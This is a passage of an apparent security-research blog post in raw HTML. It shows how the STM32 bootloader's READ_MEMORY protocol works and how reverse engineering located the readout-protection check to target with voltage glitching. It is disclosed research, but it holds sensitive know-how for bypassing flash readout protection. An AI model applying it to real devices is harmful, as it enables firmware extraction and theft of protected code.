            Figure 19+20: READ_MEMORY command sequence for host (Source figure 19: AN3155 Figure 8) and device (Source figure 20: AN3155 Figure 9)
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>We can send 0x02 and 0xFD (as checksum), and if the bootloader is fully operational, an ACK (0x79) and the PID (here 0x429) will be returned. After that, the READ_MEMORY command can be used and reviewed below.</p></div></div></div></section><section class="section section__textpic"><div id="c4737" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo.png" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/6/5/csm_Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo_807ba2bc81.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/6/5/csm_Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo_c8dc4191c9.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/6/5/csm_Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo_0a0c300c24.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/6/5/csm_Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo_35da49a8a7.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo.png" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo.png" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo.png" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_21_STM32_bootloader_implementation_for_reading_UART_commands_Logo.png" width="370" height="183" alt="STM32 bootloader implementation for reading UART commands" /></picture></a><figcaption class="image-caption">
            Figure 21: STM32 bootloader implementation for reading UART commands
        </figcaption></figure><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_22.PNG" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/d/6/csm_Figure_22_f973f05c0f.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/d/6/csm_Figure_22_f69ab4a9be.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/d/6/csm_Figure_22_1841da0701.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/d/6/csm_Figure_22_ab878d118a.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_22.PNG" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_22.PNG" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_22.PNG" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_22.PNG" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_22.PNG" width="385" height="110" alt="STM32 bootloader implementation for branching to the READ_MEMORY command" /></picture></a><figcaption class="image-caption">
            Figure 22: STM32 bootloader implementation for branching to the READ_MEMORY command
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>Figure 19 shows a fairly simple command. The user selects the command by sending 0x11 and its checksum (0xEE). Once an ACK is received, the user can send an address (e.g. 0x8000000 for start of FLASH memory) and again the checksum (which is created by XOR-ing all address bytes). Once the MCU accepts the address, an ACK is issued. Now the amount of bytes to read can be sent. Usually this will be 0xFF and its checksum 0x00 to dump 256 bytes and thus the largest amount possible. However, we are in RDP1 and therefore the command will never be ACKed. This can be seen in the flowchart that the device evaluates (figure 20).</p><p>The only way to dump memory seems to be to glitch the "Protection active?" check. But how is this check implemented exactly? We decided to dump the bootloader code (starting at 0x1fffc000) and analyze it in&nbsp;<a href="https://github.com/NationalSecurityAgency/ghidra" target="_blank" rel="noreferrer nofollow">Ghidra</a>.</p><p>First, an infinite loop resets the watchdog and then receives two bytes from the UART. These two bytes are the command and its checksum. Then, the checksum is verified. If the checksum is correct, we drop into a large if-else statement. As we are interested in the READ_MEMORY command, we search for the statement that compares the cmd variable to 0x11. This can be found on line 75 of the analyzed code in figure 22:</p></div></div></div></section><section class="section section__textpic"><div id="c4738" class="frame frame-default frame-type-textpic frame-layout-0"><div class="textpic"><div class="textpic__image textpic__image--below textpic__image--center"><figure class="image"><a href="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_23.PNG" class="lightbox"
                        rel="lightbox[1]"><picture><source srcset="/fileadmin/_processed_/7/8/csm_Figure_23_c7b3f5a491.webp" type="image/webp" media="(min-width: 992px)"><source srcset="/fileadmin/_processed_/7/8/csm_Figure_23_8ac956cef1.webp" type="image/webp" media="(min-width: 768px)"><source srcset="/fileadmin/_processed_/7/8/csm_Figure_23_a502cb00a8.webp" type="image/webp" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/7/8/csm_Figure_23_30b3d23be5.webp" type="image/webp" media="(min-width: 100px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_23.PNG" type="image/png" media="(min-width: 992px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_23.PNG" type="image/png" media="(min-width: 768px)"><source srcset="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_23.PNG" type="image/png" media="(min-width: 576px)"><source srcset="/fileadmin/_processed_/7/8/csm_Figure_23_98c246b83c.png" type="image/png" media="(min-width: 100px)"><img loading="lazy" src="/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2024_01/Figure_23.PNG" width="630" height="447" alt="STM32 bootloader implementation to check RDP and read memory at given address" /></picture></a><figcaption class="image-caption">
            Figure 23: STM32 bootloader implementation to check RDP and read memory at given address
        </figcaption></figure></div><div class="textpic__text textpic__text--below textpic__text--center"><p>Once the command is received, we immediately call the check_RDP_and_get_addr() function.&nbsp;This function will first check if RDP is enabled (by reading the register and comparing its value to 0xAA, which indicates the unlocked state) and then ACKs the command. Afterwards, it reads the address and checksum from the UART as seen in the&nbsp;flowchart in figure 20. Thus, we found our target: to glitch the "is_rdp_enabled" if statement in line 15 (figure 23). If we manage to simply skip this instruction, we will fall through into the if case and the rest of the command is executed despite being in RDP1.</p></div></div></div></section><section class="section section__text"><div id="c4739" class="frame frame-default frame-type-text frame-layout-0"><p>In order to prepare for glitching the target, we first need to implement the protocol described above for some STM32 bootloader commands. The resulting class implements various "cmd_read_memory_partX" functions that can now be used for glitching, they split the command into an init, evaluation and then dumping phase based on the flow we analyzed above.&nbsp;</p><p>&nbsp;</p><p class="text-center"><em>This research has been performed by Gerhard Hechenberger and Steffen Robertz and published on behalf of the SEC Consult Vulnerability Lab.</em></p></div></section><section class="section section__call_to_action"><div id="c4740" class="frame frame-default frame-type-call_to_action frame-layout-0"><div class="cta"><div class="cta__left"><div class=""><header><h3 >
                Are you interested in working at SEC Consult?
            </h3></header></div>
    



            SEC Consult is always searching for talented security professionals to work in our team.
        </div><div class="cta__right"><a href="/career/#c2854" class="cta__btn">
                More Information
            </a></div></div></div></section><div class="news-detail__back-link-wrap"><a class="news-detail__back-link" href="/blog/">
                    Back
                </a></div></div></div></div></div></section><!--TYPO3SEARCH_end--></div></section><footer class="footer"><div class="footer-top"><div class="footer__container"><div class="footer__row"><div class="footer__col footer__col--4"><nav><ul class="footer-nav"><li class="footer-nav__item"><a class="footer-nav__link" href="/legalnotice/">Legal Notice</a></li><li class="footer-nav__item"><a class="footer-nav__link" href="/privacy-statement/">Privacy Statement</a></li><li class="footer-nav__item"><a class="footer-nav__link" href="/career/">Jobs</a></li></ul></nav></div><div class="footer__col footer__col--8"><p class="footer-text">
                        
                        
                        
                        
                        
                        
                        
                        SEC Consult is one of the leading consultancies in the field of cyber and <a href="/security-testing/web-application-security/" title="Web Application Security">application security</a>. The company specializes in <a href="/processes-organisation/information-security-management-ism/" title="Information Security Management (ISM)">information security management</a>, NIS security audits, <a href="/security-testing/penetration-testing/" title="Pentesting (Pentest)">penetration testing</a>, ISO 27001 certification support, <a href="/incident-response/sec-defence/" title="Cyber Defence">Cyber Defence</a> and <a href="/processes-organisation/secure-software-development/" title="Secure Software Development Consulting">secure software certification</a>. SEC Consult is part of <a href="https://atos.net/" target="_blank" title="Link to Atos website" rel="noreferrer">Atos</a>.
                    </p></div></div></div></div><div class="footer-middle"><div class="footer__container"><div class="footer-logos"><a title="About us" href="/about-us/"><img class="lazyload" alt="bsi ISO/IEC 27001 Information Security Management CERTIFIED" loading="lazy" src="/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png" width="140" height="80" /></a><a title="About us" href="/about-us/"><img class="lazyload" alt="ISO 27001 CREST certified" loading="lazy" src="/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png" width="67" height="80" /></a><a title="About us" href="/about-us/"><img class="lazyload" alt="Great Place To Work AT certified" loading="lazy" src="/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png" width="47" height="80" /></a><a title="About us" href="/about-us/"><img class="lazyload" alt="Great Place To Work DE certified" loading="lazy" src="/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png" width="47" height="80" /></a></div></div></div><div class="footer-bottom"><div class="footer__container"><nav><ul class="footer-social"><li class="footer-social__item"><a class="footer-social__link" title="Twitter X" rel="noopener noreferrer" href="https://x.com/sec_consult"><span class="i-x"></span></a></li><li class="footer-social__item"><a class="footer-social__link" title="Linkedin" rel="noopener noreferrer" href="https://www.linkedin.com/company/sec-consult"><span class="i-linkedin"></span></a></li><li class="footer-social__item"><a class="footer-social__link" title="Xing" rel="noopener noreferrer" href="https://www.xing.com/companies/secconsultunternehmensberatunggmbh"><span class="i-xing"></span></a></li><li class="footer-social__item"><a class="footer-social__link" href="/contact/"><span class="i-mail-alt"></span></a></li></ul></nav></div></div></footer></div>

<div class="tx-ls-cookie-consent">
    
    <div class="cookie-panel" data-lscookie-panel="1">
        <div class="cookie-panel__inner">
            <button class="cookie-panel__close" title="Close" data-lscookie-close>
                <span class="cookie-panel__close--one"></span>
                <span class="cookie-panel__close--two"></span>
            </button>
            <div class="cookie-panel__panel">
                <h2 class="c-p-header">We use Cookies</h2>
                <div class="c-p-description">
                    <p>We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.</p>
<p><a href="/legalnotice/"><strong>Legal Notice</strong></a><strong>&nbsp;</strong> •&nbsp; <a href="/privacy-statement/"><strong>Privacy Statement</strong></a></p>
                </div>
                
                <form class="c-p-selection">
                    
                        <div class="c-p-group">
                            <div class="c-p-group__header">
                                <div class="c-p-group__header-left">
                                    <div class="c-p-group__name">
                                        <h3>
                                            Technically required
                                        </h3>
                                        <span>
                                            (
                                                0
                                                Service
                                            )
                                        </span>
                                    </div>
                                    
                                </div>
                                <div class="c-p-group__header-right">
                                    <div class="checkbox checkbox--labeled-slider checkbox--disabled">
                                        <span>no</span>
                                        <input
                                            class="checkbox-input"
                                            autocomplete="off" data-lscookie-grp="group-1" id="group-1" type="checkbox"
                                            checked disabled value="group-1" />
                                        <label class="checkbox-label--switch" for="group-1">
                                            <span class="sr-only">
                                                Technically required (
                                                0
                                                Service
                                                )
                                            </span>
                                        </label>
                                        <div class="checkbox-slider__switch checkbox-slider__switch--labeled">

                                        </div>
                                        <span>yes</span>
                                    </div>
                                </div>
                            </div>
                            
                        </div>
                    
                        <div class="c-p-group">
                            <div class="c-p-group__header">
                                <div class="c-p-group__header-left">
                                    <div class="c-p-group__name">
                                        <h3>
                                            Analysis / statistics
                                        </h3>
                                        <span>
                                            (
                                                1
                                                Service
                                            )
                                        </span>
                                    </div>
                                    <p>Anonymous evaluation for troubleshooting and further development</p>
                                </div>
                                <div class="c-p-group__header-right">
                                    <div class="checkbox checkbox--labeled-slider">
                                        <span>no</span>
                                        <input
                                            class="checkbox-input"
                                            autocomplete="off" data-lscookie-grp="group-2" id="group-2" type="checkbox"
                                             value="group-2" />
                                        <label class="checkbox-label--switch" for="group-2">
                                            <span class="sr-only">
                                                Analysis / statistics (
                                                1
                                                Service
                                                )
                                            </span>
                                        </label>
                                        <div class="checkbox-slider__switch checkbox-slider__switch--labeled">

                                        </div>
                                        <span>yes</span>
                                    </div>
                                </div>
                            </div>
                            
                                <div class="c-p-group__cookies">
                                    
                                        <div class="c-p-cookie">
                                            <div class="c-p-cookie__top">
                                                <h4>Matomo</h4>
                                                <div class="checkbox checkbox--labeled-slider">
                                                    <span>no</span>
                                                    <input
                                                        class="checkbox-input"
                                                        autocomplete="off" data-lscookie-parent="group-2" data-lscookie-cookie="cookie-5" id="cookie-5"
                                                        type="checkbox"  value="cookie-5" />
                                                    <label class="checkbox-label--switch" for="cookie-5"><span class="sr-only">Matomo</span></label>
                                                    <div class="checkbox-slider__switch checkbox-slider__switch--labeled">
                                                    </div>
                                                    <span>yes</span>
                                                </div>
                                            </div>
                                            <div class="c-p-cookie__bottom">
                                                <span>Matomo.org</span>
                                                
                                                    <a href="#" class="c-p-cookie__toggle" data-lscookie-toggle="#detail5">
                                                        <span class="c-p-cookie__toggle-show">
                                                            Show details
                                                        </span>
                                                        <span class="c-p-cookie__toggle-hide">
                                                            Hide details
                                                        </span>
                                                    </a>
                                                
                                            </div>
                                            <div class="c-p-cookie__detail" id="detail5">
                                                <p><strong>Purpose</strong>: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.<br> <strong>Processing operations</strong>: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.<br> <strong>Storage period</strong>: 1 year.<br> <strong>Joint controller</strong>: LimeSoda Interactive Marketing GmbH.<br> <strong>Legal basis for data processing</strong>: Art. 6 para. 1 lit. f of the DSGVO.<br> <strong>Consequences of non-consent</strong>: This basic tracking is absolutely necessary for the operation of our website.<br> <strong>Data transfer</strong>: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.</p>
                                                <p></p>
                                            </div>
                                        </div>
                                    
                                </div>
                            
                        </div>
                    
                        <div class="c-p-group">
                            <div class="c-p-group__header">
                                <div class="c-p-group__header-left">
                                    <div class="c-p-group__name">
                                        <h3>
                                            Targeting / Profiling / Advertising
                                        </h3>
                                        <span>
                                            (
                                                1
                                                Service
                                            )
                                        </span>
                                    </div>
                                    <p>Target group-orientated information outside the website</p>
                                </div>
                                <div class="c-p-group__header-right">
                                    <div class="checkbox checkbox--labeled-slider">
                                        <span>no</span>
                                        <input
                                            class="checkbox-input"
                                            autocomplete="off" data-lscookie-grp="group-3" id="group-3" type="checkbox"
                                             value="group-3" />
                                        <label class="checkbox-label--switch" for="group-3">
                                            <span class="sr-only">
                                                Targeting / Profiling / Advertising (
                                                1
                                                Service
                                                )
                                            </span>
                                        </label>
                                        <div class="checkbox-slider__switch checkbox-slider__switch--labeled">

                                        </div>
                                        <span>yes</span>
                                    </div>
                                </div>
                            </div>
                            
                                <div class="c-p-group__cookies">
                                    
                                        <div class="c-p-cookie">
                                            <div class="c-p-cookie__top">
                                                <h4>Google Ads</h4>
                                                <div class="checkbox checkbox--labeled-slider">
                                                    <span>no</span>
                                                    <input
                                                        class="checkbox-input"
                                                        autocomplete="off" data-lscookie-parent="group-3" data-lscookie-cookie="cookie-7" id="cookie-7"
                                                        type="checkbox"  value="cookie-7" />
                                                    <label class="checkbox-label--switch" for="cookie-7"><span class="sr-only">Google Ads</span></label>
                                                    <div class="checkbox-slider__switch checkbox-slider__switch--labeled">
                                                    </div>
                                                    <span>yes</span>
                                                </div>
                                            </div>
                                            <div class="c-p-cookie__bottom">
                                                <span>Google</span>
                                                
                                                    <a href="#" class="c-p-cookie__toggle" data-lscookie-toggle="#detail7">
                                                        <span class="c-p-cookie__toggle-show">
                                                            Show details
                                                        </span>
                                                        <span class="c-p-cookie__toggle-hide">
                                                            Hide details
                                                        </span>
                                                    </a>
                                                
                                            </div>
                                            <div class="c-p-cookie__detail" id="detail7">
                                                <p>Google Ads Conversion Tracking enables us to track user activities such as purchases or registrations after an advert click.</p>
                                                <p></p>
                                            </div>
                                        </div>
                                    
                                </div>
                            
                        </div>
                    
                </form>
            </div>
            <div class="c-p-controls">
                <button data-lscookie-save class="c-p-btn--secondary">
                    Accept selected
                </button>
                <button data-lscookie-save data-lscookie-grp="none" class="c-p-btn--secondary">
                    Reject all
                </button>
                <button data-lscookie-save data-lscookie-grp="all" class="c-p-btn--secondary">
                    Accept all
                </button>
            </div>
        </div>
    </div>

</div>



<script src="/typo3temp/assets/compressed/merged-3abc336180dc6d6089ea201707460f37-4bd8a3020e1690639016046bc462b741.js?1784637545"></script>



</body>
</html>